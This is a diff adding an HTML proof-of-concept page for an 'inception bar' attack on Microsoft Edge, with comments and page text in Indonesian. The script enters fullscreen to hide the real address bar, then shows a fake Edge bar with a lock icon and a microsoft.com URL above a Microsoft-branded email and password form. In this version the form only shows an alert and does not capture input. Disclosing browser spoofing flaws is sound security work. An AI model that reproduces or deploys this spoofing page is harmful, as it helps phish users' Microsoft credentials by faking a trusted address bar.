@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Inception Bar Attack</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family: 'Segoe UI', system-ui, sans-serif; background:#fff; }
+
+  /* FAKE EDGE ADDRESS BAR — look identical to real Edge top bar */
+  .fake-topbar {
+    position: fixed; top:0; left:0; right:0; height:48px;
+    background: #f3f3f3; border-bottom: 1px solid #e0e0e0;
+    display:flex; align-items:center; padding:0 12px; z-index:999999;
+    /* trick: when fullscreen, real bar hidden, this becomes the ONLY bar user sees */
+  }
+  .fake-nav-btn {
+    width:28px; height:28px; border-radius:50%; display:flex;
+    align-items:center; justify-content:center; margin-right:8px;
+    color:#666; font-size:16px; cursor:default;
+  }
+  .fake-address-bar {
+    flex:1; height:32px; background:#fff; border:1px solid #ccc;
+    border-radius:16px; display:flex; align-items:center; padding:0 12px;
+    font-size:14px; color:#333;
+  }
+  .fake-lock {
+    width:14px; height:14px; margin-right:6px;
+    background: #4CAF50; border-radius:2px; display:inline-block;
+    position:relative;
+  }
+  .fake-lock::after {
+    content:'🔒'; font-size:10px; position:absolute; top:-1px; left:1px;
+  }
+  .fake-url { color:#333; font-weight:400; }
+  .fake-tabs {
+    margin-left:8px; font-size:12px; color:#888;
+  }
+
+  /* real page content (attacker) below fake bar */
+  .attacker-content {
+    margin-top:60px; padding:40px; text-align:center;
+  }
+  .attacker-content h1 { color:#333; font-size:28px; margin-bottom:16px; }
+  .attacker-content input {
+    width:320px; padding:12px; border:1px solid #ddd; border-radius:6px;
+    font-size:15px; margin-bottom:12px;
+  }
+  .attacker-content button {
+    padding:12px 32px; background:#0078d4; color:#fff; border:none;
+    border-radius:6px; font-size:15px; cursor:pointer;
+  }
+</style>
+</head>
+<body>
+
+<!-- ============ FAKE EDGE TOP BAR ============ -->
+<div class="fake-topbar" id="fakebar" style="display:none;">
+  <div class="fake-nav-btn">←</div>
+  <div class="fake-nav-btn">→</div>
+  <div class="fake-nav-btn">⟳</div>
+  <div class="fake-address-bar">
+    <span class="fake-lock"></span>
+    <span class="fake-url">https://www.microsoft.com/en-us/microsoft-edge</span>
+  </div>
+  <div class="fake-tabs">⋯ ⊕</div>
+</div>
+
+<!-- ============ REAL CONTENT (attacker) ============ -->
+<div class="attacker-content" id="realcontent">
+  <h1>Selamat datang di Microsoft Edge</h1>
+  <p style="color:#666;margin-bottom:24px;">Silakan login untuk melanjutkan</p>
+  <input type="email" placeholder="Email Microsoft Anda">
+  <br>
+  <input type="password" placeholder="Password">
+  <br><br>
+  <button onclick="alert('PoC: Ini HALAMAN ATTACKER bukan microsoft.com! Fake address bar di atas = palsu.')">Sign In</button>
+  <p style="margin-top:20px;font-size:12px;color:#999;">
+    * PoC: user melihat "microsoft.com" di address bar (palsu),<br>
+    * padahal halaman ini = halaman attacker. Real address bar disembunyikan via fullscreen.
+  </p>
+</div>
+
+<button onclick="launchInception()" style="position:fixed;bottom:20px;right:20px;padding:14px 24px;background:#d93025;color:#fff;border:none;border-radius:8px;font-size:14px;z-index:999999;">
+  ▶ Mulai Inception Attack
+</button>
+
+<script>
+function launchInception(){
+  // 1. Fullscreen = real address bar hilang
+  try { document.documentElement.requestFullscreen(); } catch(e){}
+
+  // 2. Tampilkan fake address bar (di posisi real bar yang sekarang hidden)
+  setTimeout(function(){
+    document.getElementById('fakebar').style.display = 'flex';
+  }, 300);
+}
+</script>
+</body>
+</html>
